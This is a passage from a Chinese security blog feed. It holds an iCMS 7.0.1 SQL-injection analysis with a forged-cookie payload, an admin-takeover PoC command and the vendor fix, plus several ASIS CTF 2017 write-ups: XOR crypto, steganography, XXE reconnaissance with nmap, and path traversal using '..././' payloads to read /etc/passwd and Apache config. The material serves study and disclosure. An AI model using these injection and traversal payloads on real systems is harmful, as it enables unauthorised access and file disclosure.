<p>考虑从cookie获取参数的路径，即下面这段代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($a) &amp;&amp; <span class="keyword">empty</span>($p)) &#123;</div><div class="line">	$auth       = iPHP::get_cookie(<span class="keyword">self</span>::$AUTH);</div><div class="line">	<span class="keyword">list</span>($a,$p) = explode($sep,authcode($auth,<span class="string">'DECODE'</span>));</div><div class="line">	$c = <span class="keyword">self</span>::check($a,$p);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>从cookie中恢复的<code>$a</code>和<code>$p</code>没有再进行检查。所以假设我们能构造一个cookie，使得从explode恢复出来的<code>$a</code>和<code>$p</code>包含引号能够闭合，那就能引发sql注入了。</p>
<p>假设username为<code>&#39; or 1=1%23</code>，password为随意，则期望的sql注入语句为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT * FROM `#iCMS@__members` WHERE `username`=&apos;&apos; or 1=1#&apos; AND `password`=&apos;1&apos; AND `status`=&apos;1&apos; LIMIT</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170912/3.png?raw=true" alt=""></p>
<p>生成的对应的cookie即为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">4a62f154%2B9j%2BoQdL3%2BsaUTFDkMvY6WSLPzfJIFgd%2FBLE1ghVDuX4WQjoLW7es0tR60E</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170912/4.png?raw=true" alt=""></p>
<p>可以看到已经登陆成功。</p>
<p><a href="https://github.com/CHYbeta/cmsPoc" target="_blank" rel="external">cmsPoc</a>里提供了python版本的poc，对应命令如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python cmspoc.py -t icms -s v701_sqlinject_getadmin -u http://10.10.10.1:2500/iCMS-7.0.1/admincp.php</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170912/6.png?raw=true" alt=""></p>
<h1 id="修补方案"><a href="#修补方案" class="headerlink" title="修补方案"></a>修补方案</h1><p>官方在 <a href="https://github.com/idreamsoft/iCMS/releases/tag/v7.0.2" target="_blank" rel="external">v7.0.2</a>中修复了该漏洞，在members::check_login()函数中，当从cookie中获取到$a,$p后先进行了一次addslashes，之后才进行查询。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170912/5.png?raw=true" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ICMSv7.0.1 admincp.class.php sql注入分析&lt;br&gt;代码审计学习中&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
    
      <category term="sql注入" scheme="http://chybeta.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>ASISCTF2017-Simple Crypto-writeup</title>
    <link href="http://chybeta.github.io/2017/09/12/ASISCTF2017-Simple-Crypto-writeup/"/>
    <id>http://chybeta.github.io/2017/09/12/ASISCTF2017-Simple-Crypto-writeup/</id>
    <published>2017-09-11T23:34:41.000Z</published>
    <updated>2017-09-12T10:29:02.562Z</updated>
    
    <content type="html"><![CDATA[<p>ASISCTF2017-Simple Crypto-writeup<br>简单异或加密<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Begining always needs an interesting challenge, we can assure you, this challenge is an interesting one to begin the CTF!</div><div class="line">Challange Updated, please redownload the binary file!</div><div class="line"></div><div class="line">https://asisctf.com/tasks/simple_crypto_e5189fe3d3d64de3d612de266315a9e96dc43787</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>下载下来后解压得到两个文件flag.enc和simple.py。flag.enc是加密后的文件，simple.py是加密算法的实现，其代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> random</div><div class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</div><div class="line"></div><div class="line">KEY = <span class="string">'musZTXmxV58UdwiKt8Tp'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_str</span><span class="params">(x, y)</span>:</span></div><div class="line">    <span class="keyword">if</span> len(x) &gt; len(y):</div><div class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([chr(ord(z) ^ ord(p)) <span class="keyword">for</span> (z, p) <span class="keyword">in</span> zip(x[:len(y)], y)])</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([chr(ord(z) ^ ord(p)) <span class="keyword">for</span> (z, p) <span class="keyword">in</span> zip(x, y[:len(x)])])</div><div class="line"></div><div class="line">flag, key = FLAG.encode(<span class="string">'hex'</span>), KEY.encode(<span class="string">'hex'</span>)</div><div class="line">enc = xor_str(key * (len(flag) // len(key) + <span class="number">1</span>), flag).encode(<span class="string">'hex'</span>)</div><div class="line"></div><div class="line">ef = open(<span class="string">'flag.enc'</span>, <span class="string">'w'</span>)</div><div class="line">ef.write(enc.decode(<span class="string">'hex'</span>))</div><div class="line">ef.close()</div></pre></td></tr></table></figure></p>
<p>流程如下；</p>
<ol>
<li>将FLAG,KEY进行hex编码得到flag，key</li>
<li>经过xor_str()处理，将flag，key的每一位对应进行异或操作，返回最后的结果后进行一次hex编码，得到enc</li>
<li>将enc进行hex解码后写入到文件flag.enc中</li>
</ol>
<p>由于只是进行简单的异或操作，所以解密系统可以归纳如下：</p>
<ol>
<li>从flag.enc中读取，并进行hex编码，得到enc</li>
<li>把KEY进行hex编码，得到key</li>
<li>将key和enc进行xor_str()处理，并进行一次hex编码，得到flag</li>
<li>将flag进行hex解码，得到FLAG</li>
</ol>
<p>据此写出解密脚本:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_str</span><span class="params">(x, y)</span>:</span></div><div class="line">    <span class="keyword">if</span> len(x) &gt; len(y):</div><div class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([chr(ord(z) ^ ord(p)) <span class="keyword">for</span> (z, p) <span class="keyword">in</span> zip(x[:len(y)], y)])</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([chr(ord(z) ^ ord(p)) <span class="keyword">for</span> (z, p) <span class="keyword">in</span> zip(x, y[:len(x)])])</div><div class="line"></div><div class="line">ef = open(<span class="string">'flag.enc'</span>, <span class="string">'rb'</span>)</div><div class="line">flag = ef.read()</div><div class="line"></div><div class="line">KEY = <span class="string">'musZTXmxV58UdwiKt8Tp'</span></div><div class="line">key = KEY.encode(<span class="string">'hex'</span>)</div><div class="line"></div><div class="line">dec = xor_str(key * (len(flag) // len(key) + <span class="number">1</span>), flag).encode(<span class="string">'hex'</span>)</div><div class="line"></div><div class="line">df = open(<span class="string">"decflag"</span>,<span class="string">'wb'</span>)</div><div class="line">df.write(dec.decode(<span class="string">'hex'</span>))</div><div class="line">df.close()</div></pre></td></tr></table></figure></p>
<p>得到的decflag里的一长串字符用hex编辑器处理一下<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170912/1.png?raw=true" alt=""></p>
<p>得到flag：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170912/2.png?raw=true" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ASISCTF2017-Simple Crypto-writeup&lt;br&gt;简单异或加密&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Crypto" scheme="http://chybeta.github.io/categories/writeup-Crypto/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="crypto" scheme="http://chybeta.github.io/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>ASISCTF2017-ASIS secret letter-writeup</title>
    <link href="http://chybeta.github.io/2017/09/11/ASISCTF2017-ASIS-secret-letter-writeup/"/>
    <id>http://chybeta.github.io/2017/09/11/ASISCTF2017-ASIS-secret-letter-writeup/</id>
    <published>2017-09-11T13:47:37.000Z</published>
    <updated>2017-09-12T10:30:18.611Z</updated>
    
    <content type="html"><![CDATA[<p>ASISCTF2017-ASIS secret letter-writeup<br>binwalk  Stéganô<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">The face is the index of the mind, its ASIS secret letter!</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>题目提供了压缩包，解压后得到两张图片。用binwalk看一下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/Desktop/asis_letter# binwalk *</div><div class="line"></div><div class="line">Scan Time:     2017-09-06 07:51:11</div><div class="line">Target File:   /root/Desktop/asis_letter/3baa358f6d671e86f17bc4439cc4062e</div><div class="line">MD5 Checksum:  3baa358f6d671e86f17bc4439cc4062e</div><div class="line">Signatures:    344</div><div class="line"></div><div class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</div><div class="line">--------------------------------------------------------------------------------</div><div class="line">0             0x0             JPEG image data, JFIF standard 1.01</div><div class="line">30            0x1E            TIFF image data, big-endian, offset of first image directory: 8</div><div class="line">56            0x38            Zlib compressed data, default compression</div><div class="line"></div><div class="line"></div><div class="line">Scan Time:     2017-09-06 07:51:11</div><div class="line">Target File:   /root/Desktop/asis_letter/e07d17ed7d8104590ff3e17bdf052057</div><div class="line">MD5 Checksum:  e07d17ed7d8104590ff3e17bdf052057</div><div class="line">Signatures:    344</div><div class="line"></div><div class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</div><div class="line">--------------------------------------------------------------------------------</div><div class="line">0             0x0             PNG image, 4351 x 2812, 8-bit/color RGB, non-interlaced</div><div class="line">41            0x29            Zlib compressed data, default compression</div></pre></td></tr></table></figure></p>
<p>用命令<code>binwalk -e *</code>解压出文件，在图片3baa358f6d671e86f17bc4439cc4062e解压得到的文件夹中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/Desktop/asis_letter# cd _3baa358f6d671e86f17bc4439cc4062e.extracted/</div><div class="line">root@chybeta:~/Desktop/asis_letter/_3baa358f6d671e86f17bc4439cc4062e.extracted# ls</div><div class="line">38  38.zlib</div><div class="line">root@chybeta:~/Desktop/asis_letter/_3baa358f6d671e86f17bc4439cc4062e.extracted# cat 38</div><div class="line">OEorU2pDQWdabkp2YlNCQlUwbFRJSGRwZEdnZ2JHOTJaU3dnY0d4bFlYTmxJR1pwYm1RZ2MyVmpjbVYwSUcxbGMzTmhaMlVnWVc1a0lISmxjR3g1SUhOdmIyNHNJSEJ2ZDJWeVpXUWdZbmtnOEorUmlTQWdVM1REcVdkaGJzTzBJUENma1lnPQ==r</div></pre></td></tr></table></figure></p>
<p>将上面的base64串进行解密，得到：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64decode(<span class="string">"OEorU2pDQWdabkp2YlNCQlUwbFRJSGRwZEdnZ2JHOTJaU3dnY0d4bFlYTmxJR1pwYm1RZ2MyVmpjbVYwSUcxbGMzTmhaMlVnWVc1a0lISmxjR3g1SUhOdmIyNHNJSEJ2ZDJWeVpXUWdZbmtnOEorUmlTQWdVM1REcVdkaGJzTzBJUENma1lnPQ==r"</span>)</div><div class="line"><span class="string">'8J+SjCAgZnJvbSBBU0lTIHdpdGggbG92ZSwgcGxlYXNlIGZpbmQgc2VjcmV0IG1lc3NhZ2UgYW5kIHJlcGx5IHNvb24sIHBvd2VyZWQgYnkg8J+RiSAgU3TDqWdhbsO0IPCfkYg='</span></div></pre></td></tr></table></figure></p>
<p>继续进行base64解密：</p>
<p>得到提示：<code>Stéganô</code> 。</p>
<p>在github上搜索，发现了一个项目：<a href="https://github.com/cedricbonhomme/Stegano" target="_blank" rel="external">cedricbonhomme/Stegano
</a></p>
<p>经过尝试，最后的命令如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">stegano-lsb-set reveal -i e07d17ed7d8104590ff3e17bdf052057 -g triangular_numbers</div></pre></td></tr></table></figure></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ASIS&#123;767ba85340d9e49fa0bb9c2b12037f08&#125;</div></pre></td></tr></table></figure></p>
<p>或者用python<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> stegano <span class="keyword">import</span> lsbset</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> stegano.lsbset <span class="keyword">import</span> generators</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>message = lsbset.reveal(<span class="string">"./e07d17ed7d8104590ff3e17bdf052057"</span>, generators.triangular_numbers())</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>message</div><div class="line"><span class="string">'ASIS&#123;767ba85340d9e49fa0bb9c2b12037f08&#125;'</span></div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ASISCTF2017-ASIS secret letter-writeup&lt;br&gt;binwalk  Stéganô&lt;br&gt;
    
    </summary>
    
      <category term="writeup:MISC" scheme="http://chybeta.github.io/categories/writeup-MISC/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="misc" scheme="http://chybeta.github.io/tags/misc/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="steg" scheme="http://chybeta.github.io/tags/steg/"/>
    
  </entry>
  
  <entry>
    <title>ASISCTF2017-GSA File Server-writeup</title>
    <link href="http://chybeta.github.io/2017/09/11/ASISCTF2017-GSA-File-Server-writeup/"/>
    <id>http://chybeta.github.io/2017/09/11/ASISCTF2017-GSA-File-Server-writeup/</id>
    <published>2017-09-11T08:39:24.000Z</published>
    <updated>2017-09-12T10:29:37.711Z</updated>
    
    <content type="html"><![CDATA[<p>ASISCTF2017-GSA File Server-writeup<br>docx-xxe漏洞<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">GSA&apos;s file server, go find the hole, drill it and grab the flag :)</div><div class="line">Note that Scope is 128.199.40.185:*</div><div class="line">Alert: No remote brute force and automated scanning are needed.</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>查看源代码，发现有 <a href="http://128.199.40.185/js/functions.js" target="_blank" rel="external">functionds.js</a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">$( <span class="built_in">document</span> ).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    $(<span class="string">"#files"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        $.get(<span class="string">'/showFiles'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</div><div class="line">            <span class="keyword">var</span> myArray = $.parseJSON(data);</div><div class="line"></div><div class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;myArray.length; i++) &#123;</div><div class="line">                <span class="built_in">console</span>.log(myArray[i])</div><div class="line">                $(<span class="string">"#results"</span>).append(<span class="string">'&lt;a href="files/'</span>+myArray[i]+<span class="string">'"&gt;&lt;img src="/images/file-icon.png" width="50" height="50" alt="" border="0"/&gt;&lt;/a&gt;'</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;)</div><div class="line">    &#125;)</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>当在页面上的图片（它id为files）点击时，它会向 <a href="http://128.199.40.185/showFiles" target="_blank" rel="external">http://128.199.40.185/showFiles</a> 发送GET请求，并将返回的结果加到页面中。点击后即可下载文件，下载链接为 <a href="http://128.199.40.185/files/demo.docx" target="_blank" rel="external">http://128.199.40.185/files/demo.docx</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/14.png?raw=true" alt=""></p>
<p>点击页面的图片(id为files)，用burp抓包，查看返回头部；<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/12.png?raw=true" alt=""></p>
<p>在Response包中，多了<code>Directory: .</code>，消息主体为<code>[&quot;demo.docx&quot;]</code>，看上去是指当前目录（即 ./ ）下有一个文件名为demo.docx。尝试指定Directory字段为<code>..</code>，这样表示上一级目录（即 ../ ）：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/13.png?raw=true" alt=""></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/15.png?raw=true" alt=""></p>
<p>不过翻来翻去，好像莫啥用。题目给的网址是 128.199.40.185:* ，注意端口并没有指定，用nmap扫扫：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -T4 -A -v 128.199.40.185</div></pre></td></tr></table></figure></p>
<p>扫描结果大致如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">Nmap scan report for 128.199.40.185</div><div class="line">Host is up (0.20s latency).</div><div class="line">Not shown: 995 closed ports</div><div class="line">PORT     STATE SERVICE     VERSION</div><div class="line">22/tcp   open  ssh         (protocol 2.0)</div><div class="line">|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)</div><div class="line">80/tcp   open  http        Apache httpd 2.4.25 ((Ubuntu))</div><div class="line">|_http-methods: No Allow or Public header in OPTIONS response (status code 200)</div><div class="line">|_http-title: GSA File Server</div><div class="line">139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WEB-01)</div><div class="line">445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WEB-01)</div><div class="line">8081/tcp open  http        Apache httpd 2.4.25 ((Ubuntu))</div><div class="line">|_http-methods: No Allow or Public header in OPTIONS response (status code 200)</div><div class="line">|_http-title: Site doesn&apos;t have a title (text/html; charset=UTF-8).</div></pre></td></tr></table></figure></p>
<p>除了80端口外，8081端口也运行着web服务，访问：<a href="http://128.199.40.185:8081/" target="_blank" rel="external">http://128.199.40.185:8081/</a> 没啥信息。<br>结合前面利用burp探测得到的目录结构，我们访问：<a href="http://128.199.40.185:8081/panelManager-0.1/" target="_blank" rel="external">http://128.199.40.185:8081/panelManager-0.1/</a> 。有一个上传功能：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/16.png?raw=true" alt=""></p>
<p>经过初步尝试，结合前面file文件里的demo.docx文件，可以联想到XXE漏洞，关于word的xxe，可以看看<a href="https://www.blackhat.com/docs/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.pdf" target="_blank" rel="external">exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality</a>。接下来创建包含有xxe-payload的word文档。</p>
<p>(下面还未成功，能请求外部的xxe，但似乎最后没办法发送请求出来。。。我再试试)</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ASISCTF2017-GSA File Server-writeup&lt;br&gt;docx-xxe漏洞&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>ASISCTF2017-Mathilda-writeup</title>
    <link href="http://chybeta.github.io/2017/09/11/ASISCTF2017-Mathilda-writeup/"/>
    <id>http://chybeta.github.io/2017/09/11/ASISCTF2017-Mathilda-writeup/</id>
    <published>2017-09-11T07:02:47.000Z</published>
    <updated>2017-09-11T08:25:35.178Z</updated>
    
    <content type="html"><![CDATA[<p>ASISCTF2017-Mathilda-writeup<br>文件包含 apache配置userdir<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Description:</div><div class="line">Mathilda learned many skills from Leon, now she want to use them!</div><div class="line">http://178.62.48.181/</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/1.png?raw=true" alt=""></p>
<p>打开后是如上，查看源代码，发现：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/2.png?raw=true" alt=""></p>
<p>访问：<a href="http://178.62.48.181/~rooney/" target="_blank" rel="external">http://178.62.48.181/~rooney/</a> 。底下有个file选项，链接为: <a href="http://178.62.48.181/~rooney/?path=rooney" target="_blank" rel="external">http://178.62.48.181/~rooney/?path=rooney</a></p>
<p>猜测path参数存在文件包含漏洞。经过尝试，可以发现后端会把path参数里的<code>../</code>替换为空。如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/3.png?raw=true" alt=""></p>
<p>尝试读取index.php，如果直接访问 <a href="http://178.62.48.181/~rooney/index.php?path=index.php" target="_blank" rel="external">http://178.62.48.181/~rooney/index.php?path=index.php</a> ，会发现直接返回<code>Security failed!</code>，鉴于会过滤<code>../</code>，可以用<code>p../hp</code>来绕过。经过一番尝试，最后访问：<a href="http://178.62.48.181/~rooney/index.php?path=..././index.ph../p" target="_blank" rel="external">http://178.62.48.181/~rooney/index.php?path=..././index.ph../p</a></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/7.png?raw=true" alt=""><br>不过似乎没啥信息。</p>
<p>接着尝试读取 <code>/etc/passwd</code>，比如路径为 <code>../../../../etc/passwd</code>，则根据过滤，传入的参数应为：<code>..././..././..././..././etc/passwd</code>。<br>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://178.62.48.181/~rooney/?path=..././..././..././..././etc/passwd</div></pre></td></tr></table></figure></p>
<p>或者访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://178.62.48.181/~rooney/index.php?path=..././..././..././..././etc/passwd</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/4.png?raw=true" alt=""></p>
<p>最底下有一行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">th1sizveryl0ngus3rn4me:x:1001:1001:,,,:/home/th1sizveryl0ngus3rn4me:/bin/bash</div></pre></td></tr></table></figure></p>
<p>说明存在一个用户：th1sizveryl0ngus3rn4me</p>
<p>接下来需要知道一些apache的知识。apache中有一个功能 <a href="https://httpd.apache.org/docs/2.4/howto/public_html.html" target="_blank" rel="external">Per-user web directories</a>。在多用户的操作系统上，如果apache配置了UserDir，则每个用户可以在自己的目录下建立一个web服务器，对应的url即为:<a href="http://example.com/~username/" target="_blank" rel="external">http://example.com/~username/</a> ，就本例而言 <a href="http://178.62.48.181/~rooney/" target="_blank" rel="external">http://178.62.48.181/~rooney/</a> 即表示rooney用户自己的目录的web服务器。</p>
<p>所以尝试访问: <a href="http://178.62.48.181/~th1sizveryl0ngus3rn4me" target="_blank" rel="external">http://178.62.48.181/~th1sizveryl0ngus3rn4me</a> ，结果直接返回个 Invalid Device 。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/5.png?raw=true" alt=""></p>
<p>继续看看关于apache:UserDir的知识。UserDir指令可以指定被网络读取的用户网站目录，有如下几种不同的形式。</p>
<ol>
<li>路径前没有反斜杠，则被当作用户目录下的文件夹，比如配置为：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UserDir public_html</div></pre></td></tr></table></figure>
</li>
</ol>
<p>那么 <a href="http://178.62.48.181/~rooney/index.php" target="_blank" rel="external">http://178.62.48.181/~rooney/index.php</a> 会被解释为 /home/rooney/public_html/index.php</p>
<ol>
<li>路径前有反斜杠，则利用路径和文件名构造。比如配置为：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UserDir /var/html</div></pre></td></tr></table></figure>
</li>
</ol>
<p>那么 <a href="http://178.62.48.181/~rooney/index.php" target="_blank" rel="external">http://178.62.48.181/~rooney/index.php</a> 会被解释为 /var/html/rooney/index.php</p>
<ol>
<li>如果路径中存在星号<code>*</code>，则用用户名去替代，比如配置为:<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UserDir /var/www/*/docs</div></pre></td></tr></table></figure>
</li>
</ol>
<p>那么 <a href="http://178.62.48.181/~rooney/index.php" target="_blank" rel="external">http://178.62.48.181/~rooney/index.php</a> 会被解释为 /var/www/rooney/docs/index.php</p>
<ol>
<li>设置多重路径，比如配置为：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UserDir public_html /var/html</div></pre></td></tr></table></figure>
</li>
</ol>
<p>那么 <a href="http://178.62.48.181/~rooney/index.php" target="_blank" rel="external">http://178.62.48.181/~rooney/index.php</a> 会先去查找 /home/rooney/public_html/index.php ，如果找不到，那就去查找 /var/html/rooney/index.php</p>
<p>以上的这些配置指令取自<a href="https://httpd.apache.org/docs/2.4/howto/public_html.html" target="_blank" rel="external">Per-user web directories</a>的例子。这些指令需要在userdir.conf中进行配置。我们尝试读取一下服务器端的userdir.conf，访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://178.62.48.181/~rooney/</div><div class="line">?path=..././..././..././..././etc/apache2/mods-enabled/userdir.conf</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/8.png?raw=true" alt=""></p>
